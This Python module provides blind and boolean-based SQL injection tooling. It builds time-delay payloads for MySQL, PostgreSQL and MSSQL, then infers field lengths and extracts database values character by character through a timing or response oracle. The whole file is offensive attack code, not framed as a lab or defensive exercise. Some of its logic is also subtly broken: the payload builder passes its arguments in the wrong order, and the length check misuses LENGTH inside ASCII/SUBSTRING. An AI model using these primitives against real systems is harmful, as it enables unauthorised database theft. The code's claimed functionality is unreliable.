"""
Blind and Boolean-based SQL Injection Primitives (Enhanced)

This module provides:
- Timing-based and content-based inference helpers
- DBMS-specific payload builders
- Character extraction via binary search
- Length inference
- Utility wrappers for charset, retries, and full-field extraction

Supports: MySQL, PostgreSQL, MSSQL
"""

import time
from typing import Callable, Literal, Optional

DBMS = Literal["mysql", "postgres", "mssql"]
DEFAULT_CHARSET = "".join(chr(i) for i in range(32, 127))

# --- Oracle helpers ---


def time_based_oracle(
    query: str, send_fn: Callable[[str], float], threshold: float = 2.5
) -> bool:
    """Returns True if elapsed time exceeds threshold."""
    return send_fn(query) >= threshold


def boolean_based_oracle(
    query: str, send_fn: Callable[[str], str], true_condition: Callable[[str], bool]
) -> bool:
    """Returns True if true_condition passes on response body."""
    return true_condition(send_fn(query))


def retry_oracle(
    oracle_fn: Callable[[str], bool], condition: str, attempts: int = 3
) -> bool:
    for _ in range(attempts):
        if oracle_fn(condition):
            return True
    return False


# --- Charset ---


def get_charset_bounds(charset: str = DEFAULT_CHARSET) -> tuple[int, int]:
    return min(ord(c) for c in charset), max(ord(c) for c in charset)


# --- DBMS Payload Builders ---


def dbms_time_delay(
    dbms: DBMS, placeholder: str, condition: str, delay: int = 3
) -> str:
    if dbms == "mysql":
        return f"{placeholder} AND IF(({condition}), SLEEP({delay}), 0)--"
    elif dbms == "postgres":
        return f"{placeholder} AND CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
    elif dbms == "mssql":
        return f"{placeholder}; IF({condition}) WAITFOR DELAY '0:0:{delay}'--"
    raise ValueError("Unsupported DBMS")


def build_ascii_condition(
    dbms: DBMS,
    column: str,
    table: str,
    row_clause: str,
    pos: int,
    ascii_val: int,
    op: Literal["=", ">", "<"] = "=",
    delay: int = 3,
) -> str:
    core = f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {row_clause}),{pos},1)){op}{ascii_val}"
    return dbms_time_delay(dbms, core, delay)


# --- Inference Primitives ---


def find_length(
    oracle_fn: Callable[[str], bool],
    dbms: DBMS,
    column: str,
    table: str,
    row_clause: str,
    max_len: int = 100,
) -> int:
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        condition = build_ascii_condition(
            dbms, f"LENGTH({column})", table, row_clause, 1, mid, op="="
        )
        if oracle_fn(condition):
            return mid
        condition = build_ascii_condition(
            dbms, f"LENGTH({column})", table, row_clause, 1, mid, op=">"
        )
        if oracle_fn(condition):
            low = mid + 1
        else:
            high = mid - 1
    raise Exception("Unable to infer length")


def extract_string(
    length: int,
    oracle_fn: Callable[[str], bool],
    dbms: DBMS,
    column: str,
    table: str,
    row_clause: str,
    charset: str = DEFAULT_CHARSET,
    verbose: bool = False,
) -> str:
    result = ""
    for pos in range(1, length + 1):
        low, high = get_charset_bounds(charset)
        while low <= high:
            mid = (low + high) // 2
            condition = build_ascii_condition(
                dbms, column, table, row_clause, pos, mid, op=">"
            )
            if oracle_fn(condition):
                low = mid + 1
            else:
                eq_cond = build_ascii_condition(
                    dbms, column, table, row_clause, pos, mid, op="="
                )
                if oracle_fn(eq_cond):
                    if verbose:
                        print(f"[{pos}] -> {chr(mid)}")
                    result += chr(mid)
                    break
                else:
                    high = mid - 1
        else:
            result += "?"  # fallback character if not found
    return result


def extract_field(
    oracle_fn: Callable[[str], bool],
    dbms: DBMS,
    table: str,
    column: str,
    where: str,
    charset: str = DEFAULT_CHARSET,
    max_length: int = 64,
    verbose: bool = False,
) -> str:
    length = find_length(oracle_fn, dbms, column, table, where, max_length)
    return extract_string(
        length, oracle_fn, dbms, column, table, where, charset, verbose
    )


# --- End ---
